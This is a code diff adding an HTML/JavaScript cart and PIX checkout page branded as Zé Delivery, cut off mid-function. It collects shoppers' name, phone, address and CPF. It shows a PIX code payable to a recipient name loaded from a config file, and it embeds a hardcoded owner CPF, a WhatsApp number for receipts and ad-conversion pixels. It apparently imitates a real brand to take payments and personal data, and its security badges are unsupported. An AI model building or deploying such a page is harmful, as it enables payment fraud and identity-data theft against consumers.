@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Carrinho - Zé Delivery</title>
+  <script src="js/config.js"></script>
+  <!-- Meta Pixel Code -->
+  <script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '1982160662414201');
+  fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1982160662414201&ev=PageView&noscript=1"
+  /></noscript>
+  <!-- End Meta Pixel Code -->
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+  <!-- UTMify Pixel — envia conversões com UTMs para a plataforma -->
+  <script>
+    window.pixelId = "69f2f1c293857094144d9ac5";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <!-- Captura e persiste UTMs (da URL atual ou do localStorage herdado do index) -->
+  <script>
+  (function() {
+    var keys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','fbclid'];
+    var qs = new URLSearchParams(location.search);
+    keys.forEach(function(k) {
+      var fromUrl = qs.get(k);
+      if (fromUrl) localStorage.setItem('ze_' + k, fromUrl); /* URL tem prioridade */
+    });
+  })();
+  </script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; overflow: hidden; }
+    body { font-family: 'Poppins', sans-serif; background: #ffcc01; }
+
+    /* ══════════════════════════════
+       BOTTOM SHEET (CARRINHO)
+    ══════════════════════════════ */
+    .c-sheet {
+      position: fixed; top: 16px; left: 0; right: 0; bottom: 0;
+      background: #f7f7f7; border-radius: 22px 22px 0 0;
+      display: flex; flex-direction: column; overflow: hidden; z-index: 10;
+      animation: slideUpSheet .32s cubic-bezier(.25,.46,.45,.94) both;
+    }
+    @keyframes slideUpSheet { from { transform: translateY(100%); } to { transform: translateY(0); } }
+    @keyframes slideDownSheet { from { transform: translateY(0); } to { transform: translateY(100%); } }
+    .c-sheet.closing { animation: slideDownSheet .28s cubic-bezier(.55,.06,.68,.19) forwards; }
+
+    .c-handle-wrap { background: #fff; border-radius: 22px 22px 0 0; padding-top: 10px; display: flex; justify-content: center; }
+    .c-handle { width: 40px; height: 4px; border-radius: 2px; background: #ddd; margin-bottom: 10px; }
+
+    .c-header {
+      background: #fff; display: flex; align-items: center; gap: 12px;
+      padding: 6px 16px 14px; border-bottom: 1px solid #f0f0f0;
+    }
+    .c-header-down {
+      background: none; border: none; cursor: pointer; width: 36px; height: 36px;
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-size: 18px; color: #1A1A1A; flex-shrink: 0; transition: background .2s;
+    }
+    .c-header-down:hover { background: rgba(0,0,0,.07); }
+    .c-header-logo { width: 42px; height: 42px; border-radius: 50%; object-fit: cover; border: 2px solid #ffcc01; flex-shrink: 0; }
+    .c-header-store { flex: 1; min-width: 0; }
+    .c-header-storename { font-size: 14px; font-weight: 700; color: #1A1A1A; line-height: 1.2; }
+    .c-header-addmore { font-size: 12px; font-weight: 600; color: #e6b800; text-decoration: none; display: inline-block; margin-top: 2px; }
+    .c-header-addmore:hover { color: #c9a200; }
+    .c-header-count { font-size: 12px; font-weight: 600; color: #aaa; flex-shrink: 0; }
+    .c-scroll { flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch; }
+
+    /* ── Vazio ── */
+    .c-empty { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 80px 24px; text-align: center; }
+    .c-empty i { font-size: 64px; color: #ddd; margin-bottom: 20px; }
+    .c-empty h2 { font-size: 18px; font-weight: 700; margin-bottom: 8px; color: #555; }
+    .c-empty p  { font-size: 14px; color: #aaa; margin-bottom: 24px; }
+    .c-empty-btn { background: #ffcc01; color: #1A1A1A; border: none; border-radius: 24px; padding: 13px 32px; font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 15px; cursor: pointer; }
+
+    /* ── Itens ── */
+    .c-list { padding: 12px 12px 0; }
+    .c-item { background: #fff; border-radius: 14px; padding: 14px; display: flex; align-items: flex-start; gap: 12px; margin-bottom: 10px; box-shadow: 0 1px 4px rgba(0,0,0,.07); }
+    .c-item-img { width: 62px; height: 62px; border-radius: 10px; object-fit: cover; flex-shrink: 0; }
+    .c-item-body { flex: 1; min-width: 0; }
+    .c-item-name { font-size: 14px; font-weight: 700; line-height: 1.3; margin-bottom: 3px; }
+    .c-item-obs  { font-size: 12px; color: #999; margin-bottom: 8px; font-style: italic; }
+    .c-item-row  { display: flex; align-items: center; justify-content: space-between; }
+    .c-item-price { font-size: 15px; font-weight: 700; color: #077c22; }
+    .c-item-qty { display: flex; align-items: center; gap: 8px; background: #f5f5f5; border-radius: 20px; padding: 5px 12px; }
+    .c-qty-btn { background: none; border: none; cursor: pointer; font-size: 18px; font-weight: 700; color: #1A1A1A; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: background .15s; }
+    .c-qty-btn:hover:not(:disabled) { background: #e0e0e0; }
+    .c-qty-btn:disabled { opacity: .3; cursor: default; }
+    .c-qty-num { font-size: 14px; font-weight: 700; min-width: 18px; text-align: center; }
+    .c-item-del { background: none; border: none; cursor: pointer; color: #ccc; font-size: 16px; padding: 4px 4px 4px 8px; flex-shrink: 0; transition: color .2s; }
+    .c-item-del:hover { color: #e53935; }
+
+    /* ── Cards de info ── */
+    .c-info-section { margin: 10px 12px 0; background: #fff; border-radius: 14px; box-shadow: 0 1px 4px rgba(0,0,0,.07); overflow: hidden; border: 1.5px solid transparent; transition: border-color .2s; }
+    .c-info-section.c-info-error { border-color: #e53935; animation: shakeCard .35s ease; }
+    @keyframes shakeCard { 0%,100%{transform:translateX(0)} 20%,60%{transform:translateX(-5px)} 40%,80%{transform:translateX(5px)} }
+    .c-info-row { display: flex; align-items: center; gap: 12px; padding: 11px 14px; }
+    .c-info-row.c-info-empty { cursor: pointer; }
+    .c-info-row.c-info-empty:active { background: #fafafa; }
+    .c-info-icon { width: 34px; height: 34px; border-radius: 50%; background: #fff3c4; border: 1.5px solid #ffcc01; display: flex; align-items: center; justify-content: center; font-size: 13px; color: #1A1A1A; flex-shrink: 0; }
+    .c-info-icon.c-icon-empty { background: #f5f5f5; border-color: #e0e0e0; color: #bbb; }
+    .c-info-body { flex: 1; min-width: 0; }
+    .c-info-name { font-size: 13px; font-weight: 600; color: #1A1A1A; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .c-info-name.c-name-empty { color: #aaa; font-weight: 500; font-style: italic; }
+    .c-info-sub  { font-size: 12px; color: #888; margin-top: 1px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .c-info-sub.c-sub-required { color: #e53935; font-weight: 600; font-style: normal; }
+    .c-info-alterar { background: none; border: none; cursor: pointer; font-family: 'Poppins', sans-serif; font-size: 12px; font-weight: 600; color: #1A1A1A; text-decoration: underline; white-space: nowrap; flex-shrink: 0; }
+    .c-info-divider { border: none; border-top: 1px solid #f0f0f0; margin: 0 14px; }
+    .c-info-error-msg { font-size: 11px; color: #e53935; font-weight: 600; padding: 0 14px 10px; display: none; }
+    .c-info-section.c-info-error .c-info-error-msg { display: block; }
+
+    /* ── Resumo ── */
+    .c-summary { background: #fff; border-radius: 14px; margin: 10px 12px 0; padding: 18px 16px; box-shadow: 0 1px 4px rgba(0,0,0,.07); }
+    .c-sum-row { display: flex; justify-content: space-between; align-items: center; font-size: 14px; color: #555; margin-bottom: 10px; }
+    .c-sum-green { color: #077c22; font-weight: 400; }
+    .c-sum-divider { border: none; border-top: 1px solid #eee; margin: 12px 0; }
+    .c-sum-total { display: flex; justify-content: space-between; align-items: center; font-size: 17px; font-weight: 600; color: #1a1a1a; margin-bottom: 16px; }
+    .c-pix-block { background: #fffbe6; border: 1.5px solid #ffcc01; border-radius: 12px; padding: 13px 15px; display: flex; align-items: center; gap: 12px; }
+
+    /* ── Botão fixo ── */
+    .c-bottom { position: fixed; bottom: 0; left: 0; right: 0; background: #fff; border-top: 1px solid #eee; padding: 10px 16px 12px; z-index: 200; display: flex; flex-direction: column; gap: 8px; }
+    .c-pagar-btn { width: 100%; background: #ffcc01; color: #1A1A1A; border: none; border-radius: 24px; padding: 15px 18px; font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: background .2s; }
+    .c-pagar-btn:hover { background: #f0c000; }
+    .c-pagar-btn:disabled { opacity: .4; cursor: default; }
+    .c-continue-btn { background: none; border: none; cursor: pointer; font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 600; color: #888; text-decoration: underline; text-align: center; padding: 2px 0; }
+    .c-continue-btn:hover { color: #555; }
+    .c-spacer { height: 220px; }
+
+    /* ══════════════════════════════
+       MODAL CPF
+    ══════════════════════════════ */
+    .cpf-overlay {
+      position: fixed; inset: 0; z-index: 400;
+      display: flex; flex-direction: column; justify-content: flex-end;
+      animation: fadeIn .2s ease;
+    }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    .cpf-backdrop { position: absolute; inset: 0; background: rgba(0,0,0,.55); }
+    .cpf-sheet {
+      position: relative; z-index: 1;
+      background: #fff; border-radius: 22px 22px 0 0;
+      padding-bottom: env(safe-area-inset-bottom, 16px);
+      animation: slideUpModal .3s cubic-bezier(.25,.46,.45,.94);
+    }
+    @keyframes slideUpModal { from { transform: translateY(100%); } to { transform: translateY(0); } }
+    .cpf-sheet.closing { animation: slideDownSheet .25s cubic-bezier(.55,.06,.68,.19) forwards; }
+    .cpf-handle-wrap { display: flex; justify-content: center; padding: 12px 0 4px; }
+    .cpf-handle { width: 40px; height: 4px; border-radius: 2px; background: #ddd; }
+    .cpf-body { padding: 8px 20px 24px; }
+    .cpf-title { font-size: 17px; font-weight: 700; color: #1a1a1a; margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
+    .cpf-note { font-size: 13px; color: #555; line-height: 1.55; margin-bottom: 14px; }
+    .cpf-security { display: flex; align-items: center; gap: 8px; background: #f0faf3; border: 1.5px solid #b8eac7; border-radius: 8px; padding: 9px 12px; margin-bottom: 18px; font-size: 12px; color: #2e7d50; font-weight: 600; line-height: 1.4; }
+    .cpf-security i { font-size: 13px; flex-shrink: 0; }
+    .cpf-input { width: 100%; background: #fafafa; border: 1.5px solid #e8e8e8; border-radius: 10px; padding: 13px 14px; font-family: 'Poppins', sans-serif; font-size: 16px; color: #1a1a1a; outline: none; transition: border-color .2s; }
+    .cpf-input:focus { border-color: #ffcc01; background: #fff; }
+    .cpf-input.error { border-color: #e53935; }
+    .cpf-err { font-size: 11px; color: #e53935; margin-top: 4px; display: none; }
+    .cpf-err.visible { display: block; }
+    .cpf-check-row { display: flex; align-items: center; gap: 8px; margin-top: 10px; cursor: pointer; }
+    .cpf-check-row input[type=checkbox] { width: 17px; height: 17px; cursor: pointer; accent-color: #ffcc01; }
+    .cpf-check-row label { font-size: 13px; color: #666; cursor: pointer; user-select: none; }
+    .cpf-confirm-btn { width: 100%; background: #ffcc01; color: #1a1a1a; border: none; border-radius: 24px; padding: 15px; font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 20px; display: flex; align-items: center; justify-content: center; gap: 8px; transition: background .2s; }
+    .cpf-confirm-btn:hover { background: #f0c000; }
+    .cpf-confirm-btn:disabled { opacity: .5; cursor: default; }
+
+    /* ══════════════════════════════
+       OVERLAY PIX
+    ══════════════════════════════ */
+    .pix-overlay {
+      position: fixed; inset: 0; z-index: 500;
+      background: rgba(0,0,0,.75);
+      display: flex; flex-direction: column; justify-content: flex-end;
+    }
+    .pix-overlay.pix-opening { animation: fadeIn .2s ease; }
+    .pix-overlay.pix-closing { animation: fadeOut .22s ease forwards; pointer-events: none; }
+    @keyframes fadeOut { from { opacity:1; } to { opacity:0; } }
+    .pix-sheet {
+      background: #f4f4f4; border-radius: 22px 22px 0 0;
+      max-height: 92vh; display: flex; flex-direction: column;
+    }
+    .pix-sheet.pix-opening { animation: slideUpModal .32s cubic-bezier(.25,.46,.45,.94); }
+    .pix-sheet.pix-closing { animation: slideDownSheet .25s cubic-bezier(.55,.06,.68,.19) forwards; }
+    /* Header fora do scroll — botão X sempre tappável */
+    .pix-sheet-header { background: #fff; border-radius: 22px 22px 0 0; flex-shrink: 0; }
+    .pix-handle-wrap { padding-top: 10px; display: flex; justify-content: center; }
+    .pix-handle { width: 40px; height: 4px; border-radius: 2px; background: #ddd; margin-bottom: 10px; }
+    .pix-top-row { display: flex; align-items: center; justify-content: space-between; padding: 0 16px 14px; }
+    .pix-top-title { font-size: 17px; font-weight: 700; color: #1a1a1a; }
+    .pix-top-close { background: none; border: none; cursor: pointer; width: 44px; height: 44px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 17px; color: #555; transition: background .2s; -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
+    .pix-top-close:active { background: rgba(0,0,0,.12); }
+    /* Só o conteúdo scrolla */
+    .pix-content { padding: 14px; overflow-y: auto; -webkit-overflow-scrolling: touch; flex: 1; padding-bottom: env(safe-area-inset-bottom, 20px); }
+    .pix-card { background: #fff; border-radius: 14px; padding: 18px 16px; margin-bottom: 12px; box-shadow: 0 1px 5px rgba(0,0,0,.07); }
+    .px-qr-wrap { display: flex; flex-direction: column; align-items: center; gap: 0; margin-bottom: 18px; position: relative; }
+    .px-qr-skel {
+      width: 200px; height: 200px; border-radius: 12px; border: 2px solid #eee;
+      background: #f0f0f0; position: relative; overflow: hidden; flex-shrink: 0;
+    }
+    .px-qr-skel::after {
+      content: ''; position: absolute; inset: 0;
+      background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,.65) 50%, transparent 100%);
+      background-size: 200% 100%; animation: imgShimmer 1.4s infinite;
+    }
+    @keyframes imgShimmer { 0%{background-position:-200% 0} 100%{background-position:200% 0} }
+    .px-qr-img {
+      width: 200px; height: 200px; border-radius: 12px; border: 2px solid #eee;
+      object-fit: contain; opacity: 0; transition: opacity .25s ease;
+      position: absolute; top: 0; left: 0;
+    }
+    .px-qr-img.qr-loaded { opacity: 1; position: relative; }
+    .px-code-label { font-size: 12px; font-weight: 600; color: #888; text-transform: uppercase; letter-spacing: .4px; margin-bottom: 8px; }
+    .px-code-box { background: #f5f5f5; border: 1.5px dashed #ddd; border-radius: 10px; padding: 12px 14px; margin-bottom: 6px; font-family: monospace; font-size: 11px; color: #444; word-break: break-all; line-height: 1.6; cursor: pointer; transition: background .2s; }
+    .px-code-box:hover { background: #efefef; }
+    .px-code-hint { font-size: 11px; color: #bbb; text-align: center; margin-bottom: 14px; display: flex; align-items: center; justify-content: center; gap: 4px; }
+    .px-copy-btn { width: 100%; background: #ffcc01; color: #1a1a1a; border: none; border-radius: 24px; padding: 15px; font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: background .2s, color .2s; }
+    .px-copy-btn:hover { background: #f0c000; }
+    .px-copy-btn.copied { background: #077c22; color: #fff; }
+    /* ── Avisos recebedor + banco ── */
+    .px-aviso {
+      background: #fff8e1; border: 1.5px solid #ffe082;
+      border-radius: 12px; padding: 13px 14px;
+    }
+    .px-aviso-row { display: flex; align-items: flex-start; gap: 9px; }
+    .px-aviso-icon { font-size: 14px; flex-shrink: 0; margin-top: 1px; }
+    .px-aviso-text { font-size: 11.5px; color: #5a4000; line-height: 1.5; }
+    .px-aviso-text strong { font-weight: 700; color: #3d2b00; }
+    .px-badges { display: flex; gap: 6px; justify-content: center; margin-top: 16px; flex-wrap: wrap; }
+    .px-badge { display: flex; align-items: center; gap: 4px; background: #f5f5f5; border-radius: 20px; padding: 6px 10px; font-size: 11px; font-weight: 600; color: #555; white-space: nowrap; }
+    .px-badge i { font-size: 11px; }
+    .px-status { display: flex; align-items: center; gap: 10px; background: #fffdf0; border: 1.5px solid #ffe066; border-radius: 10px; padding: 12px 14px; margin-bottom: 12px; }
+    .px-status-icon { font-size: 20px; flex-shrink: 0; }
+    .px-status-text { font-size: 13px; font-weight: 600; color: #7a6000; }
+    .px-status-sub  { font-size: 12px; color: #aaa; margin-top: 2px; }
+    .px-instr-title { font-size: 14px; font-weight: 700; margin-bottom: 16px; color: #1a1a1a; }
+    .px-step { display: flex; gap: 14px; margin-bottom: 16px; align-items: flex-start; }
+    .px-step:last-child { margin-bottom: 0; }
+    .px-step-num { width: 28px; height: 28px; border-radius: 50%; background: #ffcc01; color: #1a1a1a; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; flex-shrink: 0; margin-top: 1px; }
+    .px-step-title { font-size: 14px; font-weight: 600; line-height: 1.3; margin-bottom: 2px; }
+    .px-step-sub   { font-size: 12px; color: #999; line-height: 1.4; }
+  </style>
+</head>
+<body>
+
+  <!-- ══ BOTTOM SHEET CARRINHO ══ -->
+  <div class="c-sheet" id="c-sheet">
+    <div class="c-handle-wrap"><div class="c-handle"></div></div>
+    <div class="c-header">
+      <button class="c-header-down" onclick="fecharCarrinho()"><i class="fa fa-chevron-down"></i></button>
+      <img class="c-header-logo" src="images/ze-delivery-logo.jpg" alt="Zé Delivery">
+      <div class="c-header-store">
+        <div class="c-header-storename">Zé Delivery</div>
+        <a class="c-header-addmore" href="#" onclick="fecharCarrinho(); return false;">Adicionar mais itens</a>
+      </div>
+      <span class="c-header-count" id="c-count"></span>
+    </div>
+    <div class="c-scroll">
+      <div id="c-content"></div>
+      <div class="c-spacer"></div>
+    </div>
+  </div>
+
+  <!-- ══ BOTÃO REALIZAR PAGAMENTO ══ -->
+  <div class="c-bottom">
+    <!-- Bloco recebedor PIX -->
+    <div style="display:flex;align-items:center;gap:10px;background:#f7f7f7;border-radius:10px;padding:10px 12px;margin-bottom:8px;">
+      <img src="images/pix-logo.png" alt="PIX" style="width:22px;height:22px;flex-shrink:0;object-fit:contain;">
+      <div style="flex:1;min-width:0;line-height:1.4;">
+        <div style="font-size:11px;color:#888;">Pagamento via PIX processado por</div>
+        <div style="font-size:12.5px;font-weight:700;color:#1a1a1a;"><span class="ze-nome-recebedor"></span> <span style="font-weight:400;color:#888;">· <span class="ze-instituicao"></span></span></div>
+      </div>
+      <i class="fa fa-shield-halved" style="color:#077c22;font-size:16px;flex-shrink:0;"></i>
+    </div>
+    <button class="c-pagar-btn" id="c-btn-pagar" onclick="iniciarPagamento()" disabled>
+      <i class="fa fa-lock" style="font-size:13px"></i>
+      <span>Realizar Pagamento</span>
+      <span id="c-btn-total">R$ 0,00</span>
+    </button>
+    <button class="c-continue-btn" onclick="fecharCarrinho()">Continuar comprando</button>
+  </div>
+
+  <!-- ══ MODAL CONTATO ══ -->
+  <div class="cpf-overlay" id="contato-overlay" style="display:none">
+    <div class="cpf-backdrop" onclick="fecharContatoModal()"></div>
+    <div class="cpf-sheet" id="contato-sheet">
+      <div class="cpf-handle-wrap"><div class="cpf-handle"></div></div>
+      <div class="cpf-body">
+        <div class="cpf-title"><i class="fa fa-user" style="color:#ffcc01"></i> Seus dados</div>
+        <div style="margin-bottom:14px">
+          <input id="ct-nome" class="cpf-input" type="text" placeholder="Nome completo" autocomplete="name">
+          <span id="ct-nome-err" class="cpf-err"></span>
+        </div>
+        <div style="margin-bottom:4px">
+          <input id="ct-tel" class="cpf-input" type="tel" placeholder="(00) 00000-0000" maxlength="15" inputmode="numeric" autocomplete="tel">
+          <span id="ct-tel-err" class="cpf-err"></span>
+        </div>
+        <button class="cpf-confirm-btn" onclick="salvarContato()">
+          <i class="fa fa-check" style="font-size:12px"></i> Salvar
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ MODAL ENDEREÇO ══ -->
+  <div class="cpf-overlay" id="endereco-overlay" style="display:none">
+    <div class="cpf-backdrop" onclick="fecharEnderecoModal()"></div>
+    <div class="cpf-sheet" id="endereco-sheet" style="max-height:88vh;overflow-y:auto">
+      <div class="cpf-handle-wrap"><div class="cpf-handle"></div></div>
+      <div class="cpf-body">
+        <div class="cpf-title"><i class="fa fa-map-marker-alt" style="color:#ffcc01"></i> Endereço de entrega</div>
+        <div style="margin-bottom:12px">
+          <input id="en-cep" class="cpf-input" type="text" placeholder="CEP (00000-000)" maxlength="9" inputmode="numeric">
+          <span id="en-cep-status" style="font-size:11px;margin-top:5px;display:none;font-weight:600"></span>
+        </div>
+        <div style="margin-bottom:12px">
+          <input id="en-rua" class="cpf-input" type="text" placeholder="Rua / Avenida">
+        </div>
+        <div style="display:flex;gap:10px;margin-bottom:12px">
+          <input id="en-numero" class="cpf-input" type="text" placeholder="Nº" style="width:80px;flex-shrink:0">
+          <input id="en-compl"  class="cpf-input" type="text" placeholder="Complemento (opcional)" style="flex:1">
+        </div>
+        <div style="margin-bottom:12px">
+          <input id="en-bairro" class="cpf-input" type="text" placeholder="Bairro">
+        </div>
+        <div style="display:flex;gap:10px;margin-bottom:4px">
+          <input id="en-cidade" class="cpf-input" type="text" placeholder="Cidade" style="flex:1">
+          <input id="en-estado" class="cpf-input" type="text" placeholder="UF" maxlength="2" style="width:62px;flex-shrink:0;text-transform:uppercase">
+        </div>
+        <span id="en-err" class="cpf-err"></span>
+        <button class="cpf-confirm-btn" onclick="salvarEndereco()">
+          <i class="fa fa-check" style="font-size:12px"></i> Salvar endereço
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ MODAL CPF ══ -->
+  <div class="cpf-overlay" id="cpf-overlay" style="display:none">
+    <div class="cpf-backdrop" onclick="fecharCpfModal()"></div>
+    <div class="cpf-sheet" id="cpf-sheet">
+      <div class="cpf-handle-wrap"><div class="cpf-handle"></div></div>
+      <div class="cpf-body">
+        <div class="cpf-title"><i class="fa fa-id-card" style="color:#ffcc01"></i> Informe seu CPF</div>
+        <p class="cpf-note">Necessário para processar o pagamento via PIX e emitir nota fiscal.</p>
+        <div class="cpf-security">
+          <i class="fa fa-shield-halved"></i>
+          Seus dados são protegidos e criptografados e serão utilizados somente para finalizar seu pedido.
+        </div>
+        <input id="cpf-input" class="cpf-input" type="text" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
+        <span id="cpf-err" class="cpf-err"></span>
+        <button class="cpf-confirm-btn" id="cpf-confirm-btn" onclick="confirmarCpf()">
+          <i class="fa fa-lock" style="font-size:12px"></i> Salvar e pagar
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ OVERLAY PIX ══ -->
+  <div class="pix-overlay" id="pix-overlay" style="display:none" onclick="fecharPixOverlay()">
+    <div class="pix-sheet" id="pix-sheet" onclick="event.stopPropagation()">
+      <div class="pix-sheet-header">
+        <div class="pix-handle-wrap"><div class="pix-handle"></div></div>
+        <div class="pix-top-row">
+          <span class="pix-top-title">Pagar com PIX</span>
+          <button class="pix-top-close" onclick="fecharPixOverlay()"><i class="fa fa-times"></i></button>
+        </div>
+      </div>
+      <div class="pix-content">
+
+        <div class="pix-card">
+
+          <!-- Recebedor — prepara o cliente antes de abrir o banco -->
+          <div style="background:#f0faf3;border:1.5px solid #b8eac7;border-radius:10px;padding:11px 14px;margin-bottom:16px;display:flex;align-items:flex-start;gap:10px;">
+            <i class="fa fa-circle-check" style="color:#077c22;font-size:15px;margin-top:1px;flex-shrink:0"></i>
+            <div style="font-size:12.5px;color:#1a4a2a;line-height:1.55;">
+              <strong style="display:block;margin-bottom:2px;">Pedido reservado — aguardando confirmação do pagamento.</strong>
+              Confira o nome do recebedor, ele deverá ser:<br>
+              <strong><span class="ze-nome-recebedor"></span></strong> · <span style="color:#555;"><span class="ze-instituicao"></span></span>
+            </div>
+          </div>
+
+          <div class="px-qr-wrap">
+            <div class="px-qr-skel" id="px-qr-skel"></div>
+            <img id="px-qr" class="px-qr-img" src="" alt="QR Code PIX"
+              onload="this.classList.add('qr-loaded'); document.getElementById('px-qr-skel').style.display='none';">
+          </div>
+
+          <div class="px-code-label">Código PIX copia e cola</div>
+          <div class="px-code-box" id="px-code-box" onclick="copiarCodigo()">...</div>
+          <div class="px-code-hint"><i class="fa fa-hand-pointer" style="color:#ccc"></i> Clique no código para copiar</div>
+
+          <button class="px-copy-btn" id="px-copy-btn" onclick="copiarCodigo()">
+            <i class="fa fa-copy"></i> Copiar código PIX
+          </button>
+
+          <div class="px-badges">
+            <div class="px-badge"><i class="fa fa-shield-halved" style="color:#077c22"></i> Protegido pelo PIX</div>
+            <div class="px-badge"><i class="fa fa-bolt" style="color:#b8860b"></i> Liberação em até 2 min</div>
+            <div class="px-badge"><i class="fa fa-lock" style="color:#1a7a8a"></i> Ambiente seguro</div>
+          </div>
+        </div>
+
+        <div class="px-status" id="px-status-card">
+          <div class="px-status-icon" id="px-status-icon">⏳</div>
+          <div>
+            <div class="px-status-text" id="px-status-text">Aguardando seu pagamento...</div>
+            <div class="px-status-sub" id="px-status-sub">Confirmação automática — sem precisar avisar</div>
+          </div>
+        </div>
+
+        <!-- WhatsApp após PIX gerado -->
+        <div style="background:#fff;border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 1px 5px rgba(0,0,0,.07);display:flex;align-items:center;gap:14px;">
+          <div style="width:40px;height:40px;border-radius:50%;background:#25d366;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+            <i class="fab fa-whatsapp" style="color:#fff;font-size:20px;"></i>
+          </div>
+          <div style="flex:1;min-width:0;">
+            <div style="font-size:13px;font-weight:700;color:#1a1a1a;margin-bottom:2px;">Já pagou? Mande o comprovante</div>
+            <div style="font-size:12px;color:#888;line-height:1.4;">Agiliza a confirmação do seu pedido</div>
+          </div>
+          <a href="https://wa.me/5511917254664?text=Ol%C3%A1%2C+acabei+de+pagar+meu+pedido+e+quero+enviar+o+comprovante." target="_blank" rel="noopener" style="background:#25d366;color:#fff;border:none;border-radius:20px;padding:9px 16px;font-family:'Poppins',sans-serif;font-size:12px;font-weight:700;cursor:pointer;text-decoration:none;white-space:nowrap;display:flex;align-items:center;gap:5px;">
+            <i class="fab fa-whatsapp"></i> Enviar
+          </a>
+        </div>
+
+        <div class="pix-card">
+          <div class="px-instr-title">Como realizar o pagamento</div>
+          <div class="px-step"><div class="px-step-num">1</div><div><div class="px-step-title">Copie o código PIX acima</div><div class="px-step-sub">Clique no código ou no botão "Copiar"</div></div></div>
+          <div class="px-step"><div class="px-step-num">2</div><div><div class="px-step-title">Abra o app do seu banco</div><div class="px-step-sub">Vá em PIX → Pix Copia e Cola e cole o código</div></div></div>
+          <div class="px-step"><div class="px-step-num">3</div><div><div class="px-step-title">Confirme para <strong><span class="ze-nome-recebedor"></span></strong></div><div class="px-step-sub">Verifique o valor e finalize. Seu pedido é aprovado na hora.</div></div></div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <script src="js/produtos.js"></script>
+  <script src="js/carrinho-data.js"></script>
+  <script>
+    document.querySelectorAll('.ze-nome-recebedor').forEach(el => el.textContent = ZE_CONFIG.nomeRecebedor);
+    document.querySelectorAll('.ze-instituicao').forEach(el => el.textContent = ZE_CONFIG.instituicao);
+  </script>
+  <script>
+    /* ══ CONSTANTES ══ */
+    var ZE_OWNER_CPF = '056.718.976-70';
+
+    /* ── Lê UTMs salvas no localStorage ── */
+    function getUtms() {
+      var keys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','fbclid'];
+      var u = {};
+      keys.forEach(function(k) {
+        var v = localStorage.getItem('ze_' + k);
+        if (v) u[k] = v;
+      });
+      return u;
+    }
+
+    /* ── Monta URL da página de obrigado com txId, valor e UTMs ── */
+    function obrigadoUrl() {
+      var keys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','fbclid'];
+      var params = '?txid=' + encodeURIComponent(pixAtivo.txId || '')
+                 + '&valor=' + encodeURIComponent((pixAtivo.total || 0).toFixed(2));
+      keys.forEach(function(k) {
+        var v = localStorage.getItem('ze_' + k);
+        if (v) params += '&' + k + '=' + encodeURIComponent(v);
+      });
+      return 'obrigado.html' + params;
+    }
+    var MIN_PEDIDO        = 30;
+    var pixAtivo          = null;
+    var checkInterval     = null;
+    var countdownInterval = null;
+
+    /* ══ HELPERS ══ */
+    function fmt(v) { return 'R$ ' + v.toFixed(2).replace('.', ','); }
+    function pad(n) { return n < 10 ? '0' + n : '' + n; }
+    function fmtTel(raw) {
+      var t = (raw || '').replace(/\D/g,'').slice(0,11);
+      if (t.length > 10) return '('+t.slice(0,2)+') '+t.slice(2,7)+'-'+t.slice(7);
+      if (t.length > 6)  return '('+t.slice(0,2)+') '+t.slice(2,6)+'-'+t.slice(6);
+      return t;
+    }
+    function gerarEmailPedido(nome) {
+      var primeiro = (nome || 'pedido')
+        .toLowerCase()
+        .normalize('NFD').replace(/[̀-ͯ]/g, '')
+        .replace(/[^a-z]/g, '')
+        .slice(0, 10);
+      var sufixo = Math.floor(Math.random() * 90000 + 10000)
+                 + Math.random().toString(36).slice(2, 5);
